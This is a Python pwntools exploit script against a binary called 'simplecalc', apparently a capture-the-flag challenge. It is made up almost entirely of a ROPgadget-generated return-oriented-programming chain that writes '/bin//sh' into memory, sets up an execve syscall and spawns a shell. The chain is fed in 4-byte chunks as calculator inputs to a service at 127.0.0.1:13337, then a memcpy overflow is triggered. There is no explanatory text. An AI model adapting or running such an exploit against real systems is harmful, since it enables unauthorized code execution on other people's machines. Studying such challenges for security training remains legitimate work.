#!/usr/bin/env python

from pwn import *
from struct import pack

# ROPgadget --binary simplecalc --ropchain
# Padding goes here
p = ''
p += '\x00' * 0x48
p += pack('<Q', 0x0000000000401c87) # pop rsi ; ret
p += pack('<Q', 0x00000000006c1060) # @ .data
p += pack('<Q', 0x000000000044db34) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x0000000000470f11) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401c87) # pop rsi ; ret
p += pack('<Q', 0x00000000006c1068) # @ .data + 8
p += pack('<Q', 0x000000000041c61f) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000470f11) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401b73) # pop rdi ; ret
p += pack('<Q', 0x00000000006c1060) # @ .data
p += pack('<Q', 0x0000000000401c87) # pop rsi ; ret
p += pack('<Q', 0x00000000006c1068) # @ .data + 8
p += pack('<Q', 0x0000000000437a85) # pop rdx ; ret
p += pack('<Q', 0x00000000006c1068) # @ .data + 8
p += pack('<Q', 0x000000000041c61f) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000400488) # syscall

r = remote('127.0.0.1', 13337)
#r = process('simplecalc')
#raw_input()

r.sendline(str((len(p)/4) + 1))
for i in range(0, len(p), 4):
    r.sendline(str(1))
    val = u32(p[i:i+4])
    x = 0x28
    y = val - 0x28
    r.sendline(str(x))
    r.sendline(str(y))

# trigger memcpy

r.sendline(str(5))
r.interactive()